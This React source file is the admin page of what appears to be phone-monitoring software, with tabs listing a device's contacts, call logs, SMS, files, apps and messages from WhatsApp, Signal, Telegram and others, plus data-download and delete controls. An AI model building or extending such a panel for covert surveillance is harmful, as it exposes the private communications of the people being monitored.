import React from "react";
import { useHistory } from "react-router-dom";
import { PuffLoader } from "react-spinners";

import DeviceInfo from "views/admin/Devices/IMEI/DeviceInfo";
import Contacts from "views/admin/Devices/IMEI/Contacts";
import SmsLogs from "views/admin/Devices/IMEI/SmsLogs";
import Whatsapp from "views/admin/Devices/IMEI/Whatsapp";
import Telegram from "views/admin/Devices/IMEI/Telegram";
import Signal from "views/admin/Devices/IMEI/Signal";
import Messanger from "views/admin/Devices/IMEI/Messanger";
import Viber from "views/admin/Devices/IMEI/Viber";
import Conion from "views/admin/Devices/IMEI/Conion";
import Imo from "views/admin/Devices/IMEI/Imo";
import ProtectedText from "views/admin/Devices/IMEI/ProtectedText";
import NewFileListing from "views/admin/Devices/IMEI/NewStaticFileListing";
import CallLogs from "./CallLogs";
import Apps from "./Apps";

// import {ChatHomeScreen} from "views/chat/index";//uncomment for chat
import { ResetModal } from "components/Modal/ResetModal";
import { requestReset } from "api/admin/requests";
import { saveData, moveToInbox,moveToTrash,deletePermanently ,downloadZipFile} from "api/admin/requests";

import WhatsappBusiness from "./WhatsappBusiness";

const IMEI = ({ match }) => {
  const history = useHistory();
  const [openTab, setOpenTab] = React.useState(1);
  const [imei] = React.useState(match.params.imei);
  const [loader, setLoader] = React.useState(false);
  const [recoverLoader, setRecoverLoader] = React.useState(false);
  const [deleteLoader, setDeleteLoader] = React.useState(false);

  const [showModal, setShowModal] = React.useState(false);
  const [showModalDelete, setShowModalDelete] = React.useState(false);
  //reset
  const [resetLoader, setResetLoader] = React.useState(false)
  const [showModalReset, setShowModalReset] = React.useState(false);

  const initiateDownload = () => {
    setLoader(true);

    saveData({ imei }, async() => {
     await downloadZipFile({ imei })
     setLoader(false);
    });
  };

  const deleteDevicesCall = () => {
    setDeleteLoader(true);
    deletePermanently([imei], () => {
      setDeleteLoader(false);
      // setDeleteDevices([]);
    });
  };

  const moveToInboxCall = () => {
    
    setRecoverLoader(true);
    moveToInbox([imei], () => {
      console.log("route to -", "/admin/devices/" + imei);
      history.push("/admin/devices/" + imei);
      setRecoverLoader(false);
      // setDeleteDevices([]);
    });
  };
  const trashDevicesCall = () => {
    
    setDeleteLoader(true);
    moveToTrash([imei], () => {
      setDeleteLoader(false);
      // alert("trashed")
      history.push("/admin/trash/" + imei);
    });
  };


  const [loaded,setLoaded] = React.useState({
    t1:false,
    t2:false,
    t3:false,
    t4:false,
    t5:false,
    t6:false,
    t7:false,
    t8:false,
    t9:false,
  })

  const handleResetRequest=(reset)=>{
    setResetLoader(true)
    requestReset({imei,reset},status=>{
      console.log("respoce from server",status)
      setResetLoader(false)
    })
  }

  return (
    <>
      {showModalReset ? <ResetModal setShowModalReset={setShowModalReset} resetCall={0} handleResetRequest={handleResetRequest} imei={imei} /> : null}

      {showModal ? (
        <>
          <div
            style={{
              top: "0px",
              right: "0px",
              bottom: "0px",
              left: "0px",
              backgroundColor: "#0000005e",
            }}
          className="justify-center items-center flex overflow-x-hidden overflow-y-auto fixed inset-0 z-50 outline-none focus:outline-none"
            onClick={() => setShowModal(false)}
          >
            <div className="relative w-auto my-6 mx-auto max-w-sm">
              {/*content*/}
              <div className="border-0 rounded-lg shadow-lg relative flex flex-col w-full bg-white outline-none focus:outline-none">
                {/*header*/}
                <div className="flex items-start justify-between p-5 border-b border-solid border-blueGray-200 rounded-t">
                  
                  <button
                    className="p-1 ml-auto bg-transparent border-0 text-black opacity-5 float-right text-3xl leading-none font-semibold outline-none focus:outline-none"
                    onClick={() => setShowModal(false)}
                  >
                    <span className="bg-transparent text-black opacity-5 h-6 w-6 text-2xl block outline-none focus:outline-none">
                      ×
                    </span>
                  </button>
                </div>
                {/*body*/}
                <div
                  className="relative p-6 flex-auto"
                  style={{ padding: "20px" }}
                >
                  <p className="my-4 text-blueGray-500 text-lg leading-relaxed">
                    Are you sure you want to move selected devices to inbox?
                  </p>
                </div>
                {/*footer*/}
                <div
                  style={{ padding: "20px" }}
                  className="flex items-center justify-end p-6 border-t border-solid border-blueGray-200 rounded-b"
                >
                  <button
                    className="text-red-500 background-transparent font-bold uppercase px-6 py-2 text-sm outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                    type="button"
                    onClick={() => setShowModal(false)}
                  >
                    Cancel
                  </button>
                  <button
                    className="bg-emerald-500 text-white active:bg-emerald-600 font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                    type="button"
                    onClick={moveToInboxCall}
                  >
                    Yes
                  </button>
                </div>
              </div>
            </div>
          </div>
          <div className="opacity-25 fixed inset-0 z-40 bg-black"></div>
        </>
      ) : null}

      {showModalDelete ? (
        <>
          <div
            style={{
              top: "0px",
              right: "0px",
              bottom: "0px",
              left: "0px",
              backgroundColor: "#0000005e",
            }}
            className="justify-center items-center flex overflow-x-hidden overflow-y-auto fixed inset-0 z-50 outline-none focus:outline-none"
            onClick={() => setShowModalDelete(false)}
          >
            <div className="relative w-auto my-6 mx-auto max-w-sm">
              {/*content*/}
              <div className="border-0 rounded-lg shadow-lg relative flex flex-col w-full bg-white outline-none focus:outline-none">
                {/*header*/}
                <div className="flex items-start justify-between p-5 border-b border-solid border-blueGray-200 rounded-t">
                  <h3 className="text-3xl font-semibold">
                    Delete Confirmation
                  </h3>
                  <button
                    className="p-1 ml-auto bg-transparent border-0 text-black opacity-5 float-right text-3xl leading-none font-semibold outline-none focus:outline-none"
                    onClick={() => setShowModalDelete(false)}
                  >
                    <span className="bg-transparent text-black opacity-5 h-6 w-6 text-2xl block outline-none focus:outline-none">
                      ×
                    </span>
                  </button>
                </div>
                {/*body*/}
                <div
                  className="relative p-6 flex-auto"
                  style={{ padding: "20px" }}
                >
                  <p className="my-4 text-blueGray-500 text-lg leading-relaxed">
                    Are you sure you want to {window.location.pathname.split("/")[2] == "trash"?"permanently delete":"move to trash"}  selected
                    devices? This action is irreversible.
                  </p>
                </div>
                {/*footer*/}
                <div
                  style={{ padding: "20px" }}
                  className="flex items-center justify-end p-6 border-t border-solid border-blueGray-200 rounded-b"
                >
                  <button
                    className="text-red-500 background-transparent font-bold uppercase px-6 py-2 text-sm outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                    type="button"
                    onClick={() => setShowModalDelete(false)}
                  >
                    Cancel
                  </button>
                  <button
                    className="bg-emerald-500 text-white active:bg-emerald-600 font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                    type="button"
                    onClick={()=>window.location.pathname.split("/")[2] == "trash"?deleteDevicesCall():trashDevicesCall()}
                  >
                    Yes
                  </button>
                </div>
              </div>
            </div>
          </div>
          <div className="opacity-25 fixed inset-0 z-40 bg-black"></div>
        </>
      ) : null}
      <div className="flex flex-wrap">
        <div className="relative w-full">
          <ul
            className="flex mb-0 list-none flex-wrap pt-3 pb-4 flex-row"
            role="tablist"
          >
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 1
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(1);
                }}
                data-toggle="tab"
                href="#link1"
                role="tablist"
              >
                <i className="fas fa-info-circle text-base mr-1"></i> Info
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 2
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(2);
                }}
                data-toggle="tab"
                href="#link2"
                role="tablist"
              >
                <i className="fas fa-address-book text-base mr-1"></i> Contacts
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 3
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(3);
                }}
                data-toggle="tab"
                href="#link3"
                role="tablist"
              >
                <i className="fas fa-phone-square-alt text-base mr-1"></i> Call
                Logs
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 4
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(4);
                }}
                data-toggle="tab"
                href="#link4"
                role="tablist"
              >
                <i className="fas fa-envelope-open-text text-base mr-1"></i> Sms
                Logs
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 5
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(5);
                }}
                data-toggle="tab"
                href="#link4"
                role="tablist"
              >
                <i className="fas fa-folder-open text-base mr-1"></i> Device
                Files
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 6
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(6);
                }}
                data-toggle="tab"
                href="#link5"
                role="tablist"
              >
                <i className="fab fa-whatsapp text-base mr-1"></i> Whatsapp
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 7
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(7);
                }}
                data-toggle="tab"
                href="#link5"
                role="tablist"
              >
                <i className="fab fa-telegram-plane text-base mr-1"></i>{" "}
                Telegram
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 8
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(8);
                }}
                data-toggle="tab"
                href="#link5"
                role="tablist"
              >
                <i className="far fa-comment-dots text-base mr-1"></i> Signal
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 9
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(9);
                }}
                data-toggle="tab"
                href="#link5"
                role="tablist"
              >
                <i className="fab fa-facebook-messenger text-base mr-1"></i>{" "}
                Messenger
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 10
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(10);
                }}
                data-toggle="tab"
                href="#link5"
                role="tablist"
              >
                <i className="fab fa-viber text-base mr-1"></i> Viber
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 11
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(11);
                }}
                data-toggle="tab"
                href="#link5"
                role="tablist"
              >
                <i className="fas fa-shield-virus text-base mr-1"></i> Conion
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 12
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(12);
                }}
                data-toggle="tab"
                href="#link5"
                role="tablist"
              >
                <i className="fas fa-info text-base mr-1"></i> IMO
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 13
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(13);
                }}
                data-toggle="tab"
                href="#link5"
                role="tablist"
              >
                <i className="fas fa-envelope-open-text text-base mr-1"></i>{" "}
                Protected Text
              </a>
            </li>

            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 14
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(14);
                }}
                data-toggle="tab"
                href="#link5"
                role="tablist"
              >
                <i className="fab fa-whatsapp text-base mr-1"></i>{" "}
                Whatsapp Business
              </a>
            </li>
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 15
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(15);
                }}
                data-toggle="tab"
                href="#link5"
                role="tablist"
              >
                <i className="fas fa-tablet-alt text-base mr-1"></i>{" "}
                Apps
              </a>
            </li>
            {/** uncomment for chat module */}
            {/* <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              <a
                className={
                  "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " +
                  (openTab === 16
                    ? "text-white bg-blueGray-600"
                    : "text-blueGray-600 bg-white")
                }
                onClick={(e) => {
                  e.preventDefault();
                  setOpenTab(16);
                }}
                data-toggle="tab"
                href="#link5"
                role="tablist"
              >
                <i className="fas fa-envelope-open-text text-base mr-1"></i>{" "}
                Chat
              </a>
            </li> */}


            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              {loader ? (
                <a
                  className={
                    "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal text-white bg-orange-500"
                  }
                  onClick={(e) => {
                    e.preventDefault();
                  }}
                  data-toggle="tab"
                  href="#link6"
                  role="tablist"
                >
                  <PuffLoader size="24px" />
                </a>
              ) : (
                <a
                  className={
                    "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal text-white bg-orange-500"
                  }
                  onClick={(e) => {
                    e.preventDefault();
                    initiateDownload();
                  }}
                  data-toggle="tab"
                  href="#link6"
                  role="tablist"
                >
                  <i className="fas fa-download text-base mr-1"></i> Save Data
                </a>
              )}
            </li>
            {window.location.pathname.split("/")[2] == "trash" ? (
             
              <li className="-mb-px mr-2 last:mr-0 flex-auto text-center ">
                  {recoverLoader ? (
                    <a
                      className={
                        "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal text-white bg-emerald-600"
                      }
                      onClick={(e) => {
                        e.preventDefault();
                      }}
                      style={{ background: "#22b053" }}
                      data-toggle="tab"
                      href="#link6"
                      role="tablist"
                    >
                      <PuffLoader size="24px" />
                    </a>
                  ) : (
                    <a
                      className={
                        "bg-emerald-600 flex justify-center items-center text-xs font-bold uppercase px-2 py-3 shadow-lg rounded block leading-normal text-white "
                      }
                      onClick={(e) => {
                        e.preventDefault();
                        setShowModal(true);
                        // setOpenTab(6);
                      }}
                      style={{ background: "#22b053" }}
                      data-toggle="tab"
                      href="#link6"
                      role="tablist"
                    >
                      {/* <i className="fas fa-trash text-base mr-1"></i> */}
                      <i class="fas fa-trash-restore text-base mr-1"></i>
                    </a>
                  )}
                </li>
            ) : (
              <>
                
                
              </>
            )}
            <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
                  {deleteLoader ? (
                    <a
                      className={
                        "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal text-white bg-red-500"
                      }
                      onClick={(e) => {
                        e.preventDefault();
                      }}
                      data-toggle="tab"
                      href="#link6"
                      role="tablist"
                    >
                      <PuffLoader size="24px" />
                    </a>
                  ) : (
                    <a
                      className={
                        "flex justify-center items-center text-xs font-bold uppercase px-2 py-3 shadow-lg rounded block leading-normal text-white bg-red-500"
                      }
                      onClick={(e) => {
                        e.preventDefault();
                        setShowModalDelete(true);
                        // setOpenTab(6);
                      }}
                      data-toggle="tab"
                      href="#link6"
                      role="tablist"
                    >
                      <i className="fas fa-trash text-base mr-1"></i>
                    </a>
                  )}
                </li>
              {/**un comment for device reset */}
              {/* <li className="-mb-px mr-2 last:mr-0 flex-auto text-center">
              {resetLoader ? (
                <a
                  className={
                    "flex justify-center items-center text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal text-white bg-red-500"
                  }
                  onClick={(e) => {
                    e.preventDefault();
                  }}
                  data-toggle="tab"
                  href="#link6"
                  role="tablist"
                >
                  <PuffLoader size="24px" />
                </a>
              ) : (
                <a
                  className={
                    "flex justify-center items-center text-xs font-bold uppercase px-2 py-3 shadow-lg rounded block leading-normal text-white bg-yellow-500"
                  }
                  onClick={(e) => {
                 
                    setShowModalReset(true);
                 
                  }}
                  data-toggle="tab"
                  href="#link6"
                  role="tablist"
                >
                 
                  <i class="fas fa-hammer text-base mr-1"></i>
                </a>
              )}
            </li> */}
          </ul>
          <div className="tab-content tab-space">
            <div className={openTab === 1 ? "block" : "hidden"}  id="link1">
              <DeviceInfo imei={imei} />
            </div>
            <div className={openTab === 2 ? "block" : "hidden"}  id="link2">
            {/* {openTab === 3 || loaded.t2?console.log("i am on time",loaded.t2):console.log("not any more",loaded)}
            {openTab === 3 || loaded.t2?<Contacts imei={imei} setLoaded={setLoaded} />:
            loaded.t2?<></>:<Contacts imei={imei} setLoaded={setLoaded} />
            } */}
           <Contacts imei={imei} setLoaded={setLoaded} />
            
            </div>
            <div className={openTab === 3 ? "block" : "hidden"}  id="link3">
            <CallLogs imei={imei} setLoaded={setLoaded} />
            </div>
            <div className={openTab === 4 ? "block" : "hidden"} id="link4">
              <SmsLogs imei={imei} />
            </div>
            <div className={openTab === 5 ? "block" : "hidden"} id="link6">
            {/* {openTab === 5 ||loaded.t4 ?<FileListing imei={imei}  setLoaded={setLoaded}/>:<></>} */}

            <NewFileListing imei={imei}  setLoaded={setLoaded} />
            </div>
            <div className={openTab === 6 ? "block" : "hidden"} id="link5">
              <Whatsapp imei={imei} />
            </div>
            <div className={openTab === 7 ? "block" : "hidden"} id="link5">
              <Telegram imei={imei} />
            </div>
            <div className={openTab === 8 ? "block" : "hidden"} id="link5">
              <Signal imei={imei} />
            </div>
            <div className={openTab === 9 ? "block" : "hidden"} id="link5">
              <Messanger imei={imei} />
            </div>
            <div className={openTab === 10 ? "block" : "hidden"} id="link5">
              <Viber imei={imei} />
            </div>
            <div className={openTab === 11 ? "block" : "hidden"} id="link5">
              <Conion imei={imei} />
            </div>
            <div className={openTab === 12 ? "block" : "hidden"} id="link5">
              <Imo imei={imei} />
            </div>
            <div className={openTab === 13 ? "block" : "hidden"} id="link5">
              <ProtectedText imei={imei} />
            </div>
            <div className={openTab === 14 ? "block" : "hidden"} id="link5">
              <WhatsappBusiness imei={imei} />
            </div>
            <div className={openTab === 15 ? "block" : "hidden"} id="link5">
              <Apps imei={imei} />
            </div>
            {/** uncomment for chat module */}
            {/* <div className={openTab === 16 ? "block" : "hidden"} id="link5">
              <ChatHomeScreen imei={imei} />
            </div> */}
          </div>
        </div>
      </div>
    </>
  );
};

export default IMEI;
